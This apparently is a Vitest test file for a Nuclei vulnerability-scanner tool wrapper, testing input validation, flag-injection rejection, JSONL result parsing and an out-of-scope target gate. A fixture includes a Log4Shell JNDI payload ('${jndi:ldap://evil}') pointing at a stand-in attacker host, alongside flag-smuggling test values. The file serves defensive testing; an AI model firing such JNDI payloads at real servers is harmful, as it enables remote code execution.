import { describe, expect, it, vi } from 'vitest'
import { ScopeError, ToolInputError } from '../errors'
import type { ToolContext } from '../tool'
import type { TraceRef } from '../../../shared/contracts'
import { nucleiTools, parseNucleiJsonl } from './nuclei'
import { allTools, mvpTools } from './index'

const scan = nucleiTools.find((t) => t.name === 'nuclei_scan')!

describe('nuclei_scan registration', () => {
  it('is in the full catalog but not the MVP subset', () => {
    expect(allTools.some((t) => t.name === 'nuclei_scan')).toBe(true)
    expect(mvpTools.some((t) => t.name === 'nuclei_scan')).toBe(false)
  })
})

describe('nuclei_scan parse', () => {
  it('accepts a URL plus filter lists and normalises the target', () => {
    expect(
      scan.parse({
        target: 'https://app.example.com/search?q=1',
        tags: ['cve', 'xss'],
        severity: ['critical', 'high'],
        templates: ['/opt/nuclei/custom.yaml', 'cves/2024']
      })
    ).toEqual({
      target: 'https://app.example.com/search?q=1',
      tags: ['cve', 'xss'],
      severity: ['critical', 'high'],
      templates: ['/opt/nuclei/custom.yaml', 'cves/2024']
    })
  })

  it('rejects missing, non-http and array-shaped values', () => {
    expect(() => scan.parse({})).toThrow(ToolInputError)
    expect(() => scan.parse({ target: 'ftp://app.example.com' })).toThrow(/http\(s\)/)
    expect(() => scan.parse({ target: 'https://app.example.com', tags: 'cve' })).toThrow(
      /array of strings/
    )
    expect(() => scan.parse({ target: 'https://app.example.com', severity: [''] })).toThrow(
      /non-empty string/
    )
  })

  it('refuses values that could be read as another nuclei flag', () => {
    expect(() => scan.parse({ target: 'https://app.example.com', tags: ['-proxy'] })).toThrow(
      ToolInputError
    )
    expect(() =>
      scan.parse({ target: 'https://app.example.com', severity: ['high,low'] })
    ).toThrow(ToolInputError)
  })
})

describe('parseNucleiJsonl', () => {
  it('maps nuclei JSONL lines to findings and skips noise', () => {
    const stdout = [
      '[INF] some banner noise',
      JSON.stringify({
        'template-id': 'CVE-2021-44228',
        info: {
          name: 'Apache Log4j RCE',
          severity: 'critical',
          description: 'JNDI lookup in logs'
        },
        'matched-at': 'https://app.example.com/api?x=${jndi:ldap://evil}',
        'extracted-results': ['jndi:ldap://evil']
      }),
      '{"template-id":"tech-detect",', // truncated final line
      JSON.stringify({ 'template-id': 'tech-detect', info: { name: 'Tech', severity: 'info' }, host: 'https://app.example.com' })
    ].join('\n')

    const { findings, skipped } = parseNucleiJsonl(stdout)
    expect(skipped).toBe(2)
    expect(findings).toHaveLength(2)
    expect(findings[0]).toEqual({
      template: 'CVE-2021-44228',
      name: 'Apache Log4j RCE',
      severity: 'critical',
      matchedAt: 'https://app.example.com/api?x=${jndi:ldap://evil}',
      extractedResults: ['jndi:ldap://evil'],
      description: 'JNDI lookup in logs'
    })
    expect(findings[1]).toMatchObject({
      template: 'tech-detect',
      severity: 'info',
      matchedAt: 'https://app.example.com',
      extractedResults: []
    })
  })

  it('returns nothing for empty output', () => {
    expect(parseNucleiJsonl('')).toEqual({ findings: [], skipped: 0 })
  })
})

describe('nuclei_scan scope gate', () => {
  it('rejects an out-of-scope target before spawning nuclei', async () => {
    const save = vi.fn(async () => 'trace_1' as TraceRef)
    const ctx = {
      scope: { isInScope: () => false, assertInScope: () => {}, config: {} },
      traces: { save }
    } as unknown as ToolContext

    await expect(
      scan.execute({ target: 'https://out.example.com/' }, ctx)
    ).rejects.toBeInstanceOf(ScopeError)
    expect(save).not.toHaveBeenCalled()
  })
})
